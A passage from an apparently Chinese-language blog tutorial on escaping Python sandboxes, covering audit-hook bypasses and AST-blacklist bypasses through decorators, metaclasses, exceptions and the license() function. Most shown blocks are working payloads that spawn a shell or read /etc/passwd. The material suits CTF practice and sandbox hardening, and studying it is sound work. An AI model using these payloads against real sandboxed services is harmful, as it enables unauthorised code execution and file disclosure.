class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>) </span><br></pre></td></tr></table></figure>
<p>结合上面的 <strong>loader</strong>.load_module(fullname) 可以得到最终的 payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到全程触发了 <code>builtins.input/result</code>, <code>compile</code>, <code>exec</code> 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的, <strong>loader</strong>.load_module 和 _posixsubprocess 都没有触发.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] builtins.<span class="built_in">input</span>/result, (<span class="string">&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span>,)</span><br><span class="line">[+] <span class="built_in">compile</span>, (<span class="string">b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>)</span><br><span class="line">[+] <span class="built_in">exec</span>, (&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x7fbecc924670</span>, file <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>&gt;,)</span><br></pre></td></tr></table></figure>
<p>另一种解法: <code>篡改内置函数</code></p>
<p>这道 audit hook 题还有另外一种解法.可以看到白名单是通过 set 函数返回的, <code>set</code> 作为一个内置函数实际上也是可以修改的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line">比如我们将 <span class="built_in">set</span> 函数修改为固定返回一个包含了 os.system 函数的列表 </span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>] </span><br><span class="line"><span class="number">1</span></span><br><span class="line">这样 <span class="built_in">set</span> 函数会固定返回带有 os.system 的列表.</span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>] </span><br><span class="line"><span class="number">1</span></span><br><span class="line">最终 payload:</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="篡改函数">篡改函数</h4>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag2.txt&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="其他不触发-hook-的方式">其他不触发 hook 的方式</h5>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用 __loader__.load_module(<span class="string">&#x27;os&#x27;</span>) 是为了获取 os 模块, 其实在 no builtins 利用手法中, 无需导入也可以获取对应模块. 例如:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 sys</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 os</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他的 payload 也都不会触发</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="绕过-AST-沙箱">绕过 AST 沙箱</h4>
<p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure>
<p>下面的几种利用方式来源于 hacktricks</p>
<h4 id="without-call">without call</h4>
<p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
<p><code>装饰器</code></p>
<p>利用 payload 如下:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">	 @input</span></span><br><span class="line">	 <span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.X&#x27;</span>&gt;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 <span class="built_in">input</span> 接收的, 因此也不会被拦截.</span><br><span class="line"></span><br><span class="line">其实这样的话,构造其实可以有很多,比如直接打开 <span class="built_in">help</span> 函数.</span><br><span class="line"></span><br><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">这样可以直接进入帮助文档:</span><br><span class="line"></span><br><span class="line">Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>)</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |  </span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line"> |  </span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined)</span><br><span class="line">(END)xxxxxxxxxx Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__:<span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>) |  Data descriptors defined here: |   |  __dict__ |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined) |   |  __weakref__ |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined)(END)<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__: <span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>) |  Data descriptors defined here: |   |  __dict__ |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined) |   |  __weakref__ |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined) (END) </span><br><span class="line"></span><br><span class="line">再次输入 !sh 即可打开 /<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure>
<h4 id="函数覆盖">函数覆盖</h4>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">我们知道在 Python 中获取一个的属性例如 obj[argument] 实际上是调用的 obj.__getitem__ 方法.因此我们只需要覆盖其 __getitem__ 方法, 即可在使用 obj[argument] 执行代码:</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     __getitem__ = <span class="built_in">exec</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>... </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A()[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 ast.Call。</span><br></pre></td></tr></table></figure>
<h4 id="metaclass-利用（如何在不执行构造函数的情况下获取类实例呢-）">metaclass 利用（如何在不执行构造函数的情况下获取类实例呢?）</h4>
<p>Python 中提供了一种元类(metaclass)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>除了 <strong>getitem</strong> 之外其他方法的利用方式如下:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>示例:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="exceptions-利用">exceptions 利用</h4>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span> += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br></pre></td></tr></table></figure>
<p>raise 会进入 RCE 的 <strong>init</strong>, 然后触发 <strong>iadd</strong> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        <span class="variable language_">self</span> += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    <span class="variable language_">self</span> += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line"><span class="comment"># &#123;&#125;[1337]</span></span><br></pre></td></tr></table></figure>
<p>这个 payload 将 <strong>import</strong> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <strong>import</strong>.</p>
<h4 id="通过-license-函数读取文件">通过 license 函数读取文件</h4>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 license() 时会打印这个文件的内容.</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">payload 中将 <span class="built_in">help</span> 类的 __enter__ 方法覆盖为 license 方法, 而 <span class="keyword">with</span> 语句在创建上下文时会调用 <span class="built_in">help</span> 的__enter__, 从而执行 license 方法. 这里的 <span class="built_in">help</span> 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的</span><br></pre></td></tr></table></figure>
<p>例如:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>其他绕过技巧</p>
<h4 id="模拟-no-builitins-环境">模拟 no builitins 环境</h4>
<p>no builtins 环境和 python 交互式解析器还是有所差异, 但交互式解析器并没有提供指定命名空间的功能,因此可以自己编写一个脚本进行模拟:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    global_namespace = &#123;&#125;</span><br><span class="line">    local_namespace = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; 